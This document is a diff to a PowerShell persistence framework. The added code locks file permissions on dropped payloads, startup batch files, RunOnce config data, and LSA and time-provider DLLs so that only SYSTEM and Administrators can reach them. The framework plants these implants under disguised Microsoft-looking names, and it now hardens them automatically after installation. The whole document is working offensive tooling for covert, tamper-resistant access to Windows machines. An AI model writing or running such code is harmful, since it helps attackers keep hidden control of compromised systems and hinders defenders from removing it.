@@ -7,6 +7,7 @@ param(
     [string]$DisplayName     = "Windows Defender Sync Service",
     [switch]$Install,
     [switch]$Remove,
+    [switch]$Harden,
     [int[]]$Mechanisms       = @(1,2,3,4,5,6,7,8,9,10,11)
 )
 
@@ -189,6 +190,43 @@ function Ensure-DropDir {
     }
 }
 
+function Set-HardenedPermissions {
+    param(
+        [string]$Path,
+        [switch]$IsFile
+    )
+    try {
+        $inherit = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
+        $none    = [System.Security.AccessControl.PropagationFlags]::None
+        $allow   = [System.Security.AccessControl.AccessControlType]::Allow
+
+        if ($IsFile) {
+            $acl = New-Object System.Security.AccessControl.FileSecurity
+        } else {
+            $acl = New-Object System.Security.AccessControl.DirectorySecurity
+        }
+
+        $acl.SetAccessRuleProtection($true, $false)
+
+        if ($IsFile) {
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+                "NT AUTHORITY\SYSTEM", "FullControl", $allow)))
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+                "BUILTIN\Administrators", "FullControl", $allow)))
+        } else {
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+                "NT AUTHORITY\SYSTEM", "FullControl", $inherit, $none, $allow)))
+            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
+                "BUILTIN\Administrators", "FullControl", $inherit, $none, $allow)))
+        }
+
+        Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop
+        Write-Status "Permissions hardened (SYSTEM+Admins only): $Path"
+    } catch {
+        Write-Err "Failed to harden permissions on $Path : $_"
+    }
+}
+
 function Get-PayloadPath { return "$($Script:Config.DropDir)\maint.ps1" }
 
 function Get-PSLauncher {
@@ -198,6 +236,7 @@ function Get-PSLauncher {
 
 function Stage-Payload {
     Ensure-DropDir
+    Set-HardenedPermissions -Path $Script:Config.DropDir
     $dest = Get-PayloadPath
     if ($Script:PayloadPath -ne "" -and (Test-Path $PayloadPath)) {
         Copy-Item $PayloadPath $dest -Force
@@ -206,6 +245,7 @@ function Stage-Payload {
         $EmbeddedPayloadScript | Out-File -FilePath $dest -Encoding UTF8 -Force
         Write-Status "Staged embedded payload to $dest"
     }
+    Set-HardenedPermissions -Path $dest -IsFile
 }
 
 function Install-SchedTasks {
@@ -269,7 +309,9 @@ function Install-RegRunOnce {
                 "\"& { & '$(Get-PayloadPath)'; " +
                 "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' " +
                 "-Name 'MicrosoftUpdateAssistant_RO' -Value (Get-Content '$($Script:Config.DropDir)\\cfg.dat') -Type String -Force }\""
-    $reRegCmd | Out-File "$($Script:Config.DropDir)\cfg.dat" -Encoding ASCII -Force
+    $cfgPath = "$($Script:Config.DropDir)\cfg.dat"
+    $reRegCmd | Out-File $cfgPath -Encoding ASCII -Force
+    Set-HardenedPermissions -Path $cfgPath -IsFile
     try {
         Set-ItemProperty -Path $Script:Config.RunOnceKey -Name "MicrosoftUpdateAssistant_RO" `
             -Value $reRegCmd -Type String -Force
@@ -352,7 +394,9 @@ function Install-StartupFolder {
     $startupFile = "$startupDir\WindowsMaintenance.bat"
     "@echo off`npowershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Get-PayloadPath)`"" |
         Out-File -FilePath $lnkTarget -Encoding ASCII -Force
+    Set-HardenedPermissions -Path $lnkTarget -IsFile
     Copy-Item $lnkTarget $startupFile -Force
+    Set-HardenedPermissions -Path $startupFile -IsFile
     Write-Status "Startup folder entry installed: $startupFile"
 }
 function Remove-StartupFolder {
@@ -391,6 +435,7 @@ function Install-BITSJob {
         $dummySrc  = "$($Script:Config.DropDir)\bits_trigger.txt"
         $dummyDest = "$($Script:Config.DropDir)\bits_trigger_out.txt"
         "trigger" | Out-File $dummySrc -Force
+        Set-HardenedPermissions -Path $dummySrc -IsFile
         Import-Module BitsTransfer -ErrorAction SilentlyContinue
         $job = Start-BitsTransfer -Source "file://$dummySrc" -Destination $dummyDest `
             -DisplayName $Script:Config.Marker -Description $Script:Config.Marker `
@@ -417,6 +462,12 @@ function Install-LSAPackage {
             Set-ItemProperty -Path $key -Name $propName -Value $new -Type MultiString -Force
             Write-Status "LSA Notification Package entry added"
         } else { Write-Warn "LSA package entry already present." }
+        $lsaDll = "$env:WINDIR\System32\wbemntfy.dll"
+        if (Test-Path $lsaDll) {
+            Set-HardenedPermissions -Path $lsaDll -IsFile
+        } else {
+            Write-Warn "wbemntfy.dll not yet in System32 — harden it after you copy it there"
+        }
     } catch { Write-Err "LSA Notification Package failed: $_" }
 }
 function Remove-LSAPackage {
@@ -433,12 +484,18 @@ function Remove-LSAPackage {
 function Install-TimeProvider {
     Write-Warn "TimeProv: compile w32tmaux.dll (see DLL_BUILD_GUIDE.md), copy to Maintenance folder, restart W32Time."
     $keyPath = "$($Script:Config.TimeProv)\NtpClientAux"
+    $dllPath = "$($Script:Config.DropDir)\w32tmaux.dll"
     try {
         if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
-        Set-ItemProperty -Path $keyPath -Name DllName       -Value "$($Script:Config.DropDir)\w32tmaux.dll" -Type String -Force
+        Set-ItemProperty -Path $keyPath -Name DllName       -Value $dllPath -Type String -Force
         Set-ItemProperty -Path $keyPath -Name Enabled       -Value 1 -Type DWord -Force
         Set-ItemProperty -Path $keyPath -Name InputProvider -Value 0 -Type DWord -Force
         Write-Status "Time Provider registry written"
+        if (Test-Path $dllPath) {
+            Set-HardenedPermissions -Path $dllPath -IsFile
+        } else {
+            Write-Warn "w32tmaux.dll not yet present — harden it after you copy it to $($Script:Config.DropDir)"
+        }
     } catch { Write-Err "Time Provider failed: $_" }
 }
 function Remove-TimeProvider {
@@ -468,6 +525,41 @@ function Remove-ServiceRecovery {
             Write-Status "Cleared failure recovery for: $svc"
         } catch { Write-Warn "Could not clear recovery for $svc" }
     }
+}
+
+function Invoke-HardenAll {
+    Write-Host "`n[*] Hardening permissions on all artifact paths..." -ForegroundColor White
+
+    $dropDir = $Script:Config.DropDir
+    if (Test-Path $dropDir) {
+        Set-HardenedPermissions -Path $dropDir
+    }
+
+    $files = @(
+        "$dropDir\maint.ps1",
+        "$dropDir\maint.bat",
+        "$dropDir\cfg.dat",
+        "$dropDir\bits_trigger.txt",
+        "$dropDir\w32tmaux.dll"
+    )
+    foreach ($f in $files) {
+        if (Test-Path $f) { Set-HardenedPermissions -Path $f -IsFile }
+    }
+
+    $startupFile = "$([Environment]::GetFolderPath('CommonStartup'))\WindowsMaintenance.bat"
+    if (Test-Path $startupFile) { Set-HardenedPermissions -Path $startupFile -IsFile }
+
+    $lsaDll = "$env:WINDIR\System32\wbemntfy.dll"
+    if (Test-Path $lsaDll) {
+        Set-HardenedPermissions -Path $lsaDll -IsFile
+    } else {
+        Write-Warn "wbemntfy.dll not found in System32 — deploy it then re-run -Harden"
+    }
+
+    Write-Host "`n[+] Hardening complete. Verify with:" -ForegroundColor Green
+    Write-Host "    icacls `"$dropDir`"" -ForegroundColor Green
+    Write-Host "    icacls `"$startupFile`"" -ForegroundColor Green
+    Write-Host "    icacls `"$lsaDll`"" -ForegroundColor Green
 }
 
 function Enable-RDPNow {
@@ -517,18 +609,23 @@ function Show-Summary {
     Write-Host ""
 }
 
-if (-not $Install -and -not $Remove) {
+if (-not $Install -and -not $Remove -and -not $Harden) {
     Show-Banner
     Write-Host "Usage:" -ForegroundColor Yellow
     Write-Host "  Install all:  .\Invoke-PersistenceFramework.ps1 -Install"
     Write-Host "  Install some: .\Invoke-PersistenceFramework.ps1 -Install -Mechanisms 1,2,5"
     Write-Host "  Remove all:   .\Invoke-PersistenceFramework.ps1 -Remove"
+    Write-Host "  Harden only:  .\Invoke-PersistenceFramework.ps1 -Harden"
     Write-Host "  Custom path:  .\Invoke-PersistenceFramework.ps1 -Install -PayloadPath C:\myagent.exe"
     Show-Summary
     exit 0
 }
 
 Show-Banner
+
+if ($Harden) {
+    Invoke-HardenAll
+}
 
 if ($Install) {
     Write-Host "[*] Installing persistence mechanisms..." -ForegroundColor White
@@ -540,6 +637,7 @@ if ($Install) {
             & $MechanismMap[$num].Install
         }
     }
+    Invoke-HardenAll
     Write-Host "`n[+] All selected mechanisms installed." -ForegroundColor Green
     Write-Host "    Payload: $(Get-PayloadPath)" -ForegroundColor Green
     Write-Host "    Logs:    $($Script:Config.DropDir)\svc.log`n" -ForegroundColor Green
